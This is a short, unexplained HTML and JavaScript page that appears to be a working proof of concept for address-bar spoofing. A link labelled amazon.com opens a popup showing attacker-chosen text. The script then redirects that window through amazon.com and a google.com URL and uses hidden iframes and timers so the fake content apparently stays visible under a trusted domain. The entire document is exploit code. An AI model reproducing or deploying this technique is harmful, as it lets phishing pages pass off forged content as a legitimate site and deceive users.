<body>
<a id=test href="https://www.amazon.com/" onclick=foo()>https://www.amazon.com/</a>
</body>

<script>

var w;
var t;
var z;

if(location.href.indexOf("fake") !== -1){
document.body.innerHTML = "<h1>This website has moved to http://fake.com</h1>";
}


function foo(){

document.getElementById("test").href="#";

w = window.open("?fake");

t = setInterval('bar()',1);

}

function bar(){

if(w.location.href !== 'about:blank'){

alert("Redirecting");

document.body.innerHTML = "<h1>Redirecting</h1>";

slow();

w.location.href = 'https://www.amazon.com/';

clearInterval(t);

z = setInterval('baz()',1);

}

}

function baz(){
try{
w.location.href !== 'about:blank';
}
catch (e){

//stop page loading
w.location.href='https://www.google.com/csi';
clearInterval(z);

//Make sure the old content is not cleared
setTimeout("alert('ok');window.location.href='about:blank';window.close();", 3000);
}

}


//slow down the website
function slow() {
for (i=0; i<10; i++ ) {

iframe = document.createElement("iframe");
iframe.src = 'https://www.amazon.com/';
iframe.style = 'display:none';
document.body.appendChild(iframe);

}
}

</script>
